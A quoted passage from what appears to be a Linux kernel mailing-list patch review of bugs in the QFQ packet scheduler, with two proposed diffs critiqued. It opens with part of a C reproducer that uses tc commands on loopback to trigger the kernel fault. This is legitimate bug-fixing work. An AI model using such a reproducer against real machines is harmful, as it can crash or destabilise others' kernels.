->
->     system("tc qdisc add dev lo parent 2:1 handle 3: choke limit 2
-> bandwidth 1kbit min 1 max 2 burst 1");
->
->     loopback_send(2000);
->
->     system("tc class del dev lo classid 1:1");
->
->     system("timeout 0.1 ping -c 1 -W0.01 localhost > /dev/null");
-> }
->
-> My opinion is that creating separate patches for each bug would be an
-> easier way to approach the problem.
->
-> I tested the suggested patch and found some possible issues.
->
-> diff --git a/net/sched/sch_qfq.c b/net/sched/sch_qfq.c
-> index bf1282cb22eb..6d85da21c4b8 100644
-> --- a/net/sched/sch_qfq.c
-> +++ b/net/sched/sch_qfq.c
-> @@ -1258,7 +1258,17 @@ static int qfq_enqueue(struct sk_buff *skb,
-> struct Qdisc *sch,
->     agg =3D cl->agg;
->     /* if the class is active, then done here */
->     if (cl_is_active(cl)) {
-> -       if (unlikely(skb =3D=3D cl->qdisc->ops->peek(cl->qdisc)) &&
-> +       const u32 pre_peek_backlog =3D sch->qstats.backlog;
-> +
-> +       skb =3D cl->qdisc->ops->peek(cl->qdisc);
-> +       /* Address corner case where a child qdisc dropped the packet
-> +        * in peek after enqueue returned success.
-> +        * Qdiscs like netem may exhibit this behaviour.
-> +        */
-> +       if (unlikely(sch->qstats.backlog < pre_peek_backlog))
-> +           return NET_XMIT_SUCCESS | __NET_XMIT_BYPASS;
-> +
-> +       if (unlikely(skb) &&
->             list_first_entry(&agg->active, struct qfq_class, alist)
->             =3D=3D cl && cl->deficit < len)
->             list_move_tail(&cl->alist, &agg->active);
->
-> First, in the proposed patch, the peek function of qfq_enqueue checks
-> qstats.backlog to know if a packet has been dropped. However, since
-> qstats.backlog decreases during the normal peek process, it would be
-> better to use the q.qlen.
->
-> diff --git a/net/sched/sch_api.c b/net/sched/sch_api.c
-> index c5e3673aadbe..10fb72fef98e 100644
-> --- a/net/sched/sch_api.c
-> +++ b/net/sched/sch_api.c
-> @@ -814,6 +814,11 @@ void qdisc_tree_reduce_backlog(struct Qdisc *sch,
-> int n, int len)
->             WARN_ON_ONCE(parentid !=3D TC_H_ROOT);
->             break;
->         }
-> +
-> +       if (unlikely((!sch->q.qlen && n) ||
-> +                (!sch->qstats.backlog && len)))
-> +           continue;
-> +
->         cops =3D sch->ops->cl_ops;
->         if (notify && cops->qlen_notify) {
->             cl =3D cops->find(sch, parentid);
->
-> Also, if the qdisc_tree_reduce_backlog function excludes cases where
-> qlen is 0, as in the above patch, the normal tbf qdisc features may
-> not work.
->
-> static int tbf_segment(struct sk_buff *skb, struct Qdisc *sch,
->                struct sk_buff **to_free)
-> ...
->     sch->q.qlen +=3D nb;
->     sch->qstats.backlog +=3D len;
->     if (nb > 0) {
->         qdisc_tree_reduce_backlog(sch, 1 - nb, prev_len - len);
->         consume_skb(skb);
->         return NET_XMIT_SUCCESS;
->     }
->
-> For example, qlen can be 0 when calling qdisc_tree_reduce_backlog on
-> tbf_segment in the code above.
->
-> Additionally, I believe that using the peek function in the enqueue
-> function can increase the complexity of qdisc and can lead to a number
-> of issues. Therefore, I believe that avoiding the use of peek in the
-> enqueue function will reduce the chance of introducing bugs.
->
-> Thanks,
-> Mingi
 
